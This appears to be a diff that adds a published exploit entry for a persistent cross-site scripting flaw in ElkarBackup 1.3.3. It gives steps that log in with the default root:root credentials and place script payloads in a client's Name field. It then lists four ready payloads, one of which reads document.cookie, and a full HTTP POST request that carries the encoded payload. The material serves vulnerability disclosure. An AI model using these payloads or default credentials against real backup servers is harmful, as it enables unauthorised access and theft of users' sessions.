@@ -1,0 +1,40 @@
+# Exploit Title: ElkarBackup 1.3.3 - Persistent Cross-Site Scripting
+# Date: 2020-08-14
+# Exploit Author: Enes Özeser
+# Vendor Homepage: https://www.elkarbackup.org/
+# Version: 1.3.3
+# Tested on: Linux
+
+1- Go to following url. >> http://(HOST)/elkarbackup/login
+2- Default username and password is root:root. We must know login credentials. 
+3- Go to "Jobs" and press "Add client" button.
+4- Write XSS payload in "Name" section.
+5- Press "Save" button.
+
+(( Executable XSS Payloads ))
+
+1- "><script>alert('XSS Confirmed!');</script>
+2- "><script>alert("XSS Confirmed!");</script>
+3- "><script>alert(document.cookie);</script>
+4- "><script>alert(document.domain);</script>
+
+
+(( REQUEST ))
+
+POST /elkarbackup/client/2 HTTP/1.1
+Host: (HOST)
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://(HOST)/elkarbackup/client/2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 358
+Connection: close
+Cookie: PHPSESSID=dop3m1qj8c5octaxuasd21as2
+Upgrade-Insecure-Requests: 1
+
+Client%5Bname%5D=%22%3E%3Cscript%3Ealert%28%22XSS+Confirmed%21%22%29%3C%2Fscript%3E&
+Client%5Burl%5D=&Client%5Bquota%5D=-1&Client%5Bdescription%5D=&Client%5BisActive%5D=1&
+Client%5BmaxParallelJobs%5D=1&Client%5Bowner%5D=1&Client%5BsshArgs%5D=&Client%5BrsyncShortArgs%5D=&
+Client%5BrsyncLongArgs%5D=&Client%5B_token%5D=yrL8pXqx-sTVYhLQBpL523I-BOnSqoRyZnd5MUt2bfI
